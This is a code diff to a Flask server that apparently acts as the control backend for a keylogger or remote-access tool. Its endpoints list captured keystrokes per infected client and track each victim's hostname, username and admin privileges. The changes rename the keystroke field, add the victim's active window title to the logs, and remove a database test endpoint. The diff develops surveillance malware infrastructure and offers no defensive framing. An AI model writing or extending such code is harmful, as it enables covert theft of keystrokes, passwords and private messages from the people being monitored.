@@ -553,9 +553,9 @@ def get_client_keylogs(client_id):
         if db:
             db_logs = db.get_keylogs(client_id, limit)
             logs = [{
-                "keys": log['keystrokes'],
+                "keystroke": log['keystrokes'],
                 "timestamp": log['timestamp'].isoformat() if hasattr(log['timestamp'], 'isoformat') else str(log['timestamp']),
-                "app": log.get('metadata', {}).get('app', 'Unknown')
+                "window": log.get('metadata', {}).get('window_title', log.get('metadata', {}).get('app', 'Unknown'))
             } for log in db_logs]
             total_logs = len(db_logs)
         else:
@@ -621,90 +621,9 @@ def get_keylogs_stats():
         return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500
 
 
-@app.route('/admin/test_db', methods=['GET'])
-def test_database():
-    """Test database connection and insertion"""
-    try:
-        if not db:
-            return jsonify({"error": "Database not connected"}), 500
-        
-        import uuid
-        test_id = f"test-{uuid.uuid4()}"
-        
-        # Test system info in the NEW format
-        test_system_info = {
-            "platform": {
-                "system": "Linux",
-                "version": "6.1.0",
-                "hostname": "test-machine",
-                "release": "Debian",
-                "machine": "x86_64"
-            },
-            "hardware": {
-                "cpu_count": 4,
-                "cpu_model": "Intel Core i7",
-                "total_ram": 8589934592
-            },
-            "user": {
-                "username": "testuser",
-                "computer_name": "test-machine"
-            },
-            "privileges": {
-                "is_admin": False
-            }
-        }
-        
-        # Test registration
-        print(f"[TEST] Attempting to register test client: {test_id}")
-        success = db.register_client(test_id, test_system_info, "127.0.0.1")
-        
-        if not success:
-            return jsonify({
-                "success": False,
-                "error": "register_client returned False",
-                "test_id": test_id
-            }), 500
-        
-        # Try to retrieve it
-        print(f"[TEST] Attempting to retrieve test client: {test_id}")
-        client = db.get_client(test_id)
-        
-        if not client:
-            return jsonify({
-                "success": False,
-                "error": "Client was inserted but not found on retrieval",
-                "test_id": test_id,
-                "register_returned": success
-            }), 500
-        
-        # Get all clients count
-        all_clients = db.get_all_clients()
-        
-        return jsonify({
-            "success": True,
-            "message": "Database test passed!",
-            "test_client": {
-                "id": client['client_id'],
-                "hostname": client['hostname'],
-                "os_type": client['os_type'],
-                "username": client['username']
-            },
-            "total_clients_in_db": len(all_clients)
-        })
-        
-    except Exception as e:
-        import traceback
-        return jsonify({
-            "success": False,
-            "error": str(e),
-            "traceback": traceback.format_exc()
-        }), 500
-
-
 @app.before_request
 def before_request():
     print(f"[REQUEST] {request.method} {request.path} - Clients: {len(clients)}")
-
 
 
 @app.after_request
